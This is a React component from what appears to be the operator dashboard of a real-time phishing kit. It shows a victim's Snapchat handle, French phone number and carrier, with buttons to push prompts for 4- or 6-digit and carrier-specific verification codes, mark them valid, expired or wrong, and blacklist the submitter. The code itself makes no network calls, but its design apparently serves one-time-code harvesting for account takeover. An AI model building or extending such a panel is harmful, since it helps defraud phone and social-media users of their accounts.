import { motion } from "framer-motion";
import { RefreshCw, Check, X, Clock, Ban } from "lucide-react";

const operatorBadge = {
  SFR: "bg-[#d1f2ef] text-[#0e746a] border-[#0e746a]/20",
  Bouygues: "bg-[#d1f2ef] text-[#0e746a] border-[#0e746a]/20",
  Orange: "bg-[#d1f2ef] text-[#0e746a] border-[#0e746a]/20",
};

const formatPhone = (tel) => {
  const t = String(tel || "").replace(/\D/g, "");
  return t.replace(/(\d{2})(?=\d)/g, "$1 ").trim();
};

const actions = [
  { id: "code_ready", label: "Send code (4)", cls: "bg-[#0e746a] text-white hover:bg-[#0c5f57]" },
  { id: "code6", label: "Resend (6 digits)", cls: "bg-purple-50 text-purple-600 border border-purple-200 hover:bg-purple-100" },
  { id: "code6sfr", label: "Resend (SFR)", cls: "bg-red-50 text-red-600 border border-red-200 hover:bg-red-100" },
  { id: "code6orange", label: "Resend (Orange)", cls: "bg-orange-50 text-orange-600 border border-orange-200 hover:bg-orange-100" },
  { id: "valid", label: "Validate", cls: "bg-green-50 text-green-600 border border-green-200 hover:bg-green-100" },
  { id: "wrong", label: "Wrong number", cls: "bg-red-50 text-red-600 border border-red-200 hover:bg-red-100" },
  { id: "expired", label: "Code expired", cls: "bg-yellow-50 text-yellow-600 border border-yellow-200 hover:bg-yellow-100" },
];

export default function ClaimedActions({ submission, onAction, onBlacklist, busyKey }) {
  const sub = submission;

  return (
    <motion.div
      initial={{ opacity: 0, y: 10 }}
      animate={{ opacity: 1, y: 0 }}
      className="bg-white rounded-2xl border border-[#e5e7eb] p-6 flex flex-col min-h-[60vh]"
    >
      <div className="flex items-center justify-between mb-4">
        <div>
          <span className="text-[10px] text-[#0e746a] font-bold uppercase tracking-wider">Managing request</span>
          <h2 className="text-lg font-bold text-gray-900">{sub.snapchat}</h2>
        </div>
        <span className="text-[11px] text-gray-400 font-mono">#{sub.id.slice(-6)}</span>
      </div>

      <div className="flex items-center gap-2 mb-1">
        <span className={`text-[10px] font-bold px-2 py-0.5 rounded-full border ${operatorBadge[sub.operateur]}`}>
          {sub.operateur}
        </span>
      </div>
      <p className="text-2xl font-bold text-gray-900 font-mono tracking-tight mb-5">{formatPhone(sub.telephone)}</p>

      <div className="grid grid-cols-2 gap-2.5 mt-auto">
        {actions.map((a) => (
          <button
            key={a.id}
            disabled={!!busyKey}
            onClick={() => onAction(a.id)}
            className={`text-xs font-semibold py-2.5 rounded-lg transition-colors disabled:opacity-50 flex items-center justify-center gap-1.5 ${a.cls}`}
          >
            {busyKey === a.id ? (
              <span className="w-3.5 h-3.5 border-2 border-current/30 border-t-current rounded-full animate-spin" />
            ) : a.label}
          </button>
        ))}
        <button
          disabled={!!busyKey}
          onClick={onBlacklist}
          className="col-span-2 bg-red-50 text-red-600 border border-red-200 hover:bg-red-100 text-xs font-semibold py-2.5 rounded-lg transition-colors disabled:opacity-50 flex items-center justify-center gap-1.5"
        >
          <Ban className="w-3.5 h-3.5" /> Instant blacklist
        </button>
      </div>
    </motion.div>
  );
}